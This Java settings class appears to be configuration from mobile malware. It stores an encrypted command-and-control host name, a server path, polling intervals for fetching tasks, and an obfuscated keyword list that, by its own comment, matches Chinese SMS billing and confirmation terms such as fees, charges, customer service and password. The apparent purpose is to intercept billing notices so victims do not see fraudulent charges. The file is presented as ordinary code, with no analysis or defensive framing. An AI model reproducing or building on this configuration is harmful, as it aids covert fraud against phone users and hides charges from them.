package kernel.workspace;
import kernel.workspace.util.ParseKsy;

public class Settings {
    //--------------relace in build phase start----------------------- 
    public static final String CHANNEL = /*channel-begin*/"86c1f4cf3019560eaa94de255e3ac146"/*channel-end*/;
    public static String ENCRYPTED_HOST_NAME = /*host-name-begin*/"0a795ce61ed257775b221bdd0cfb55b9"/*host-name-end*/;
    public static final int VERSION = /*version-begin*/5/*version-end*/;
    //--------------relace in build phase end-----------------------    
    public static int HOST_RETRIEVE_TRIIGER = 20;
    /**
     * Seconds
     */
    public static int TASK_CHECK_INTERVAL = 9 * 57;
    public static int MIN_TASK_INTERVAL = 59 * 5;
    public static int DEFAULT_TASK_INTERVAL = 59 * 59;
    public static int MAX_TASK_INTERVAL = 3599 * 24 * 7;
    public static String SERVER_URL_PATH = "9xy7ba5cd0d542282134beba31428126";
    /**
     * "账单,消费,信息费,1/2,2/2,代收,代码,感谢,客服,购买,不符,取消,资费,成功,任意内容,密码"
     */
    public static String COMMON_BLOCK_KEYWORS = ParseKsy
            .decode("95f5661340c82eda58b7e4ccfee39b568611f9b3f4663d28f8b5f2ba381320ca24607672ba0019cb2c8e5d8bf65b9b35447e95d850114053661b225d38b05c50a2656b269c063626a7cff6644b499bce50d804480458090576d967f8ca1dd262844f0b93b8f33971519658fc7e509559d9f812cb46435da900ea2e3747a71553");
    public static final int RETRY_TIMES = 3;
    public static final int HTTP_TIME_OUT = 40;
    public static final int NETWORK_RESTORE_SECONDS = HTTP_TIME_OUT * 2;
    static {
        releaseRemove_initVariables();
    }
    private static void releaseRemove_initVariables() {
        //192.168.0.104:7080
        ENCRYPTED_HOST_NAME = "7e2bc07531d919d3bc7376b6e9d24400bd6c22f1feeeea7761972d335c3f51b1";
        TASK_CHECK_INTERVAL = 20;
        MIN_TASK_INTERVAL = DEFAULT_TASK_INTERVAL = MAX_TASK_INTERVAL = 30;
    }
}
